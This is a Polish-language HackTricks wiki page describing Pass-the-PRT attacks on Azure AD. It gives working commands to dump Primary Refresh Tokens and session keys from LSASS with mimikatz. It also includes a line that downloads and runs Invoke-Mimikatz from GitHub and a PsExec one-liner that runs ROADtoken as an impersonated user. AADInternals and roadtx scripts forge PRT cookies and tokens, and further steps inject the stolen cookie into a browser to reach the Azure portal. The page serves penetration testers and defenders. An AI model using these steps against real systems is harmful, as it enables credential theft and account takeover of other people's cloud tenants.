# Az - Przekazanie PRT

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCYJNY**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów github.

</details>

## Co to jest PRT

{% content-ref url="az-primary-refresh-token-prt.md" %}
[az-primary-refresh-token-prt.md](az-primary-refresh-token-prt.md)
{% endcontent-ref %}

### Sprawdź, czy masz PRT
```
Dsregcmd.exe /status
```
W sekcji Stanu SSO powinieneś zobaczyć **`AzureAdPrt`** ustawione na **YES**.

<figure><img src="../../../.gitbook/assets/image (10) (3).png" alt=""><figcaption></figcaption></figure>

W tym samym wyniku możesz również sprawdzić, czy **urządzenie jest dołączone do Azure** (w polu `AzureAdJoined`):

<figure><img src="../../../.gitbook/assets/image (10) (2).png" alt=""><figcaption></figcaption></figure>

## PRT Cookie

PRT cookie jest właściwie nazywane **`x-ms-RefreshTokenCredential`** i jest to JSON Web Token (JWT). JWT zawiera **3 części**, **nagłówek**, **payload** i **podpis**, podzielone kropką `.` i wszystkie zakodowane w formacie url-safe base64. Typowe PRT cookie zawiera następujący nagłówek i treść:
```json
{
"alg": "HS256",
"ctx": "oYKjPJyCZN92Vtigt/f8YlVYCLoMu383"
}
{
"refresh_token": "AQABAAAAAAAGV_bv21oQQ4ROqh0_1-tAZ18nQkT-eD6Hqt7sf5QY0iWPSssZOto]<cut>VhcDew7XCHAVmCutIod8bae4YFj8o2OOEl6JX-HIC9ofOG-1IOyJegQBPce1WS-ckcO1gIOpKy-m-JY8VN8xY93kmj8GBKiT8IAA",
"is_primary": "true",
"request_nonce": "AQABAAAAAAAGV_bv21oQQ4ROqh0_1-tAPrlbf_TrEVJRMW2Cr7cJvYKDh2XsByis2eCF9iBHNqJJVzYR_boX8VfBpZpeIV078IE4QY0pIBtCcr90eyah5yAA"
}
```
Aktualny **Primary Refresh Token (PRT)** jest zamknięty wewnątrz **`refresh_token`**, który jest zaszyfrowany kluczem pod kontrolą Azure AD, co sprawia, że jego zawartość jest nieczytelna i nieodczytywalna dla nas. Pole **`is_primary`** oznacza zamknięcie głównego tokena odświeżającego wewnątrz tego tokena. Aby zapewnić, że ciasteczko pozostaje powiązane z konkretną sesją logowania, z którą jest związane, `request_nonce` jest przesyłane z strony `logon.microsoftonline.com`.

### Przepływ PRT Cookie przy użyciu TPM

Proces **LSASS** przesyła do TPM **kontekst KDF**, a TPM używa **klucza sesji** (zebranego podczas rejestracji urządzenia w AzureAD i przechowywanego w TPM) oraz poprzedniego kontekstu do **wygenerowania klucza**, a ten **wygenerowany klucz** jest używany do **podpisania ciasteczka PRT (JWT).**

**Kontekst KDF** to nonce z AzureAD i PRT tworzący **JWT**, połączony z **kontekstem** (losowe bajty).

Dlatego nawet jeśli PTR nie może zostać wyodrębniony, ponieważ znajduje się wewnątrz TPM, nadal można wykorzystać LSASS do **żądania wygenerowania kluczy z nowych kontekstów i użyć wygenerowanych kluczy do podpisywania ciasteczek**.

<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Przykłady nadużyć PRT

Jako **zwykły użytkownik** można **żądać użycia PRT**, prosząc LSASS o dane SSO.\
Można to zrobić tak jak **aplikacje natywne**, które żądają tokenów od **Web Account Manager** (broker tokenów). WAM przekazuje żądanie do **LSASS**, który prosi o tokeny, używając podpisanego PRT. Można to również zrobić za pomocą **przepływów opartych na przeglądarce (web)**, gdzie **ciasteczko PRT** jest używane jako **nagłówek** do uwierzytelniania żądań do stron logowania Azure AS.

Jako **SYSTEM** można **ukraść PRT, jeśli nie jest chroniony** przez TPM lub **interakcjonować z kluczami PRT w LSASS** za pomocą interfejsów kryptograficznych.

## Przykłady ataków Pass-the-PRT

### Atak - ROADtoken

Aby uzyskać więcej informacji na temat tej metody, [**sprawdź ten post**](https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/). ROADtoken uruchomi **`BrowserCore.exe`** z odpowiedniego katalogu i użyje go do **uzyskania ciasteczka PRT**. Następnie to ciasteczko można użyć z ROADtools do uwierzytelnienia i **uzyskania trwałego tokenu odświeżającego**.

Aby wygenerować prawidłowe ciasteczko PRT, pierwszą rzeczą, którą potrzebujesz, jest nonce.\
Możesz go uzyskać za pomocą:
```powershell
$TenantId = "19a03645-a17b-129e-a8eb-109ea7644bed"
$URL = "https://login.microsoftonline.com/$TenantId/oauth2/token"

$Params = @{
"URI"     = $URL
"Method"  = "POST"
}
$Body = @{
"grant_type" = "srv_challenge"
}
$Result = Invoke-RestMethod @Params -UseBasicParsing -Body $Body
$Result.Nonce
AwABAAAAAAACAOz_BAD0_8vU8dH9Bb0ciqF_haudN2OkDdyluIE2zHStmEQdUVbiSUaQi_EdsWfi1 9-EKrlyme4TaOHIBG24v-FBV96nHNMgAA
```
Lub używając [**roadrecon**](https://github.com/dirkjanm/ROADtools):
```powershell
roadrecon auth prt-init
```
Następnie możesz użyć [**roadtoken**](https://github.com/dirkjanm/ROADtoken), aby uzyskać nowy PRT (uruchom narzędzie z procesu użytkownika, którego chcesz zaatakować):
```powershell
.\ROADtoken.exe <nonce>
```
Jako jednoliniowy kod: 

{% code overflow="wrap" %}
```powershell
Invoke-Command - Session $ps_sess -ScriptBlock{C:\Users\Public\PsExec64.exe - accepteula -s "cmd.exe" " /c C:\Users\Public\SessionExecCommand.exe UserToImpersonate C:\Users\Public\ROADToken.exe AwABAAAAAAACAOz_BAD0__kdshsy61GF75SGhs_[...] > C:\Users\Public\PRT.txt"}
```
{% endcode %}

Następnie możesz użyć **wygenerowanego pliku cookie** do **generowania tokenów** w celu **logowania** za pomocą Azure AD **Graph** lub Microsoft Graph:
```powershell
# Generate
roadrecon auth --prt-cookie <prt_cookie>

# Connect
Connect-AzureAD --AadAccessToken <token> --AccountId <acc_ind>
```
### Atak - Użycie roadrecon

### Atak - Użycie AADInternals i wyciekłego PTR

`Get-AADIntUserPRTToken` **pobiera token PRT użytkownika** z komputera dołączonego do Azure AD lub hybrydowo dołączonego. Używa `BrowserCore.exe` do pobrania tokenu PRT.
```powershell
# Get the PRToken
$prtToken = Get-AADIntUserPRTToken

# Get an access token for AAD Graph API and save to cache
Get-AADIntAccessTokenForAADGraph -PRTToken $prtToken
```
Lub jeśli masz wartości z Mimikatz, możesz również użyć AADInternals do wygenerowania tokena:
```powershell
# Mimikat "PRT" value
$MimikatzPRT="MC5BWU..."

# Add padding
while($MimikatzPrt.Length % 4) {$MimikatzPrt += "="}

# Decode
$PRT=[text.encoding]::UTF8.GetString([convert]::FromBase64String($MimikatzPRT))

# Mimikatz "Clear key" value
$MimikatzClearKey="37c5ecdfeab49139288d8e7b0732a5c43fac53d3d36ca5629babf4ba5f1562f0"

# Convert to Byte array and B64 encode
$SKey = [convert]::ToBase64String( [byte[]] ($MimikatzClearKey -replace '..', '0x$&,' -split ',' -ne ''))

# Generate PRTToken with Nonce
$prtToken = New-AADIntUserPRTToken -RefreshToken $PRT -SessionKey $SKey -GetNonce
$prtToken
## You can already use this token ac cookie in the browser

# Get access token from prtToken
$AT = Get-AADIntAccessTokenForAzureCoreManagement -PRTToken $prtToken

# Verify access and connect with Az. You can see account id in mimikatz prt output
Connect-AzAccount -AccessToken $AT -TenantID <tenant-id> -AccountId <acc-id>
```
Przejdź do [https://login.microsoftonline.com](https://login.microsoftonline.com), wyczyść wszystkie pliki cookie dla login.microsoftonline.com i wprowadź nowe pliki cookie.
```
Name: x-ms-RefreshTokenCredential
Value: [Paste your output from above]
Path: /
HttpOnly: Set to True (checked)
```
Następnie przejdź do [https://portal.azure.com](https://portal.azure.com)

{% hint style="danger" %}
Reszta powinna być domyślna. Upewnij się, że możesz odświeżyć stronę i ciasteczko nie zniknie. Jeśli tak się stanie, możesz popełnić błąd i będziesz musiał przejść przez proces ponownie. Jeśli nie, powinno być dobrze.
{% endhint %}

### Atak - Mimikatz

#### Kroki

1. **PRT (Primary Refresh Token) jest wyodrębniany z LSASS** (Local Security Authority Subsystem Service) i przechowywany do późniejszego użycia.
2. Następnie **wyodrębniany jest klucz sesji**. Ponieważ ten klucz jest początkowo wydawany, a następnie ponownie szyfrowany przez lokalne urządzenie, konieczne jest odszyfrowanie za pomocą klucza głównego DPAPI. Szczegółowe informacje na temat DPAPI (Data Protection API) można znaleźć w tych źródłach: [HackTricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords), a dla zrozumienia jego zastosowania, należy odwołać się do ataku [Pass-the-cookie](az-pass-the-cookie.md).
3. Po odszyfrowaniu klucza sesji **uzyskiwane są klucz pochodny i kontekst dla PRT**. Są one kluczowe dla **tworzenia pliku cookie PRT**. Konkretnie, klucz pochodny jest używany do podpisania JWT (JSON Web Token), który stanowi plik cookie. Szczegółowe wyjaśnienie tego procesu zostało przedstawione przez Dirk-jan, dostępne [tutaj](https://dirkjanm.io/digging-further-into-the-primary-refresh-token/).

{% hint style="danger" %}
Należy zauważyć, że jeśli PRT znajduje się w TPM, a nie w `lsass`, **mimikatz nie będzie w stanie go wyodrębnić**.\
Jednak będzie możliwe **uzyskanie klucza z klucza pochodnego z kontekstu** z TPM i użycie go do **podpisania pliku cookie (sprawdź opcję 3).**
{% endhint %}

Możesz znaleźć **szczegółowe wyjaśnienie przeprowadzonego procesu** wyodrębniania tych szczegółów tutaj: [**https://dirkjanm.io/digging-further-into-the-primary-refresh-token/**](https://dirkjanm.io/digging-further-into-the-primary-refresh-token/)

{% hint style="warning" %}
To nie zadziała dokładnie po wprowadzeniu poprawek w sierpniu 2021 roku, aby uzyskać tokeny PRT innych użytkowników, ponieważ tylko użytkownik może uzyskać swój PRT (lokalny administrator nie może uzyskać dostępu do PRT innych użytkowników), ale może uzyskać dostęp do swojego.
{% endhint %}

Możesz użyć **mimikatz** do wyodrębnienia PRT:
```powershell
mimikatz.exe
Privilege::debug
Sekurlsa::cloudap

# Or in powershell
iex (New-Object Net.Webclient).downloadstring("https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1")
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::cloudap"'
```
(Obrazy z https://blog.netwrix.com/2023/05/13/pass-the-prt-overview)

<figure><img src="../../../.gitbook/assets/image (4) (1) (3).png" alt=""><figcaption></figcaption></figure>

**Skopiuj** część oznaczoną jako **Prt** i zapisz ją.\
Wyodrębnij również klucz sesji (wartość **`KeyValue`** pola **`ProofOfPossesionKey`**) widoczną poniżej. Jest on zaszyfrowany i będziemy musieli użyć naszych kluczy głównych DPAPI do jego odszyfrowania.

<figure><img src="../../../.gitbook/assets/image (11) (2).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Jeśli nie widzisz żadnych danych PRT, może to oznaczać, że **nie masz żadnych PRT**, ponieważ urządzenie nie jest dołączone do Azure AD, lub może to oznaczać, że **korzystasz z przestarzałej wersji** systemu Windows 10.
{% endhint %}

Aby **odszyfrować** klucz sesji, musisz **podnieść** swoje uprawnienia do **SYSTEMU**, aby uruchomić w kontekście komputera i móc użyć **klucza głównego DPAPI do jego odszyfrowania**. Możesz użyć następujących poleceń:
```
token::elevate
dpapi::cloudapkd /keyvalue:[PASTE ProofOfPosessionKey HERE] /unprotect
```
<figure><img src="../../../.gitbook/assets/image (12) (2).png" alt=""><figcaption></figcaption></figure>

#### Opcja 1 - Pełny Mimikatz

* Teraz chcesz skopiować zarówno wartość Context:

<figure><img src="../../../.gitbook/assets/image (13) (1).png" alt=""><figcaption></figcaption></figure>

* Jak i wartość klucza pochodnego:

<figure><img src="../../../.gitbook/assets/image (15) (1).png" alt=""><figcaption></figcaption></figure>

* W końcu możesz użyć wszystkich tych informacji do **generowania plików cookie PRT**:
```bash
Dpapi::cloudapkd /context:[CONTEXT] /derivedkey:[DerivedKey] /Prt:[PRT]
```
<figure><img src="../../../.gitbook/assets/image (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

* Przejdź do [https://login.microsoftonline.com](https://login.microsoftonline.com), wyczyść wszystkie pliki cookie dla login.microsoftonline.com i wprowadź nowe cookie.
```
Name: x-ms-RefreshTokenCredential
Value: [Paste your output from above]
Path: /
HttpOnly: Set to True (checked)
```
* Następnie przejdź do [https://portal.azure.com](https://portal.azure.com)

{% hint style="danger" %}
Reszta powinna być domyślna. Upewnij się, że możesz odświeżyć stronę i ciasteczko nie zniknie. Jeśli tak się stanie, możesz popełnić błąd i będziesz musiał przejść przez proces ponownie. Jeśli nie zniknie, powinno być dobrze.
{% endhint %}

#### Opcja 2 - roadrecon za pomocą PTR

* Najpierw odnow PRT, który zostanie zapisany w `roadtx.prt`:

{% code overflow="wrap" %}
```bash
roadtx prt -a renew --prt <PRT From mimikatz> --prt-sessionkey <clear key from mimikatz>
```
{% endcode %}

* Teraz możemy **żądać tokenów** za pomocą interaktywnej przeglądarki za pomocą polecenia `roadtx browserprtauth`. Jeśli użyjemy polecenia `roadtx describe`, zobaczymy, że token dostępu zawiera twierdzenie MFA, ponieważ PRT, którego użyłem w tym przypadku, również zawierał twierdzenie MFA.
```bash
roadtx browserprtauth
roadtx describe < .roadtools_auth
```
<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

#### Opcja 3 - roadrecon przy użyciu pochodnych kluczy

Posiadając kontekst i pochodny klucz wydobyty przez mimikatz, można użyć roadrecon do wygenerowania nowego podpisanego ciasteczka za pomocą:

{% code overflow="wrap" %}
```bash
roadrecon auth --prt-cookie <cookie> --prt-context <context> --derives-key <derived key>
```
{% endcode %}

## Odnośniki

* [https://stealthbits.com/blog/lateral-movement-to-the-cloud-pass-the-prt/](https://stealthbits.com/blog/lateral-movement-to-the-cloud-pass-the-prt/)
* [https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/](https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/)
* [https://www.youtube.com/watch?v=x609c-MUZ\_g](https://www.youtube.com/watch?v=x609c-MUZ\_g)

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
